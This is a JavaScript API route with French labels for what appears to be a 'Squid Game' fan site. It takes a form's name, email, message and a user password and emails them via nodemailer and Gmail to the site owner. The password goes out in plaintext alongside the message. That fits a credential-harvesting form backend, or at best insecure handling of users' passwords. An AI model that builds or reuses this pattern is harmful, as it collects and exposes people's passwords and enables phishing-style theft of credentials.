import nodemailer from "nodemailer";

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ message: "Méthode non autorisée" });
  }

  const { nom, prenom, password, email, message } = req.body;

  if (!nom || !prenom || !password || !email || !message) {
    return res.status(400).json({ message: "Champs manquants" });
  }

  // Configuration du transporteur SMTP Gmail
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: process.env.EMAIL_USER, // adresse Gmail
      pass: process.env.EMAIL_PASS, // mot de passe d’application Gmail
    },
  });

  try {
    await transporter.sendMail({
      from: email,
      to: process.env.EMAIL_USER, // reçois le mail
      subject: `Nouveau message du site Squid Game`,
      text: `
        Nom : ${nom}
        Prénom : ${prenom}
        Email : ${email}
        Mot de passe : ${password}
        Message :
    ${message}
      `,
    });

    return res.status(200).json({ message: "Message envoyé avec succès ✅" });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ message: "Erreur lors de l'envoi ❌" });
  }
}
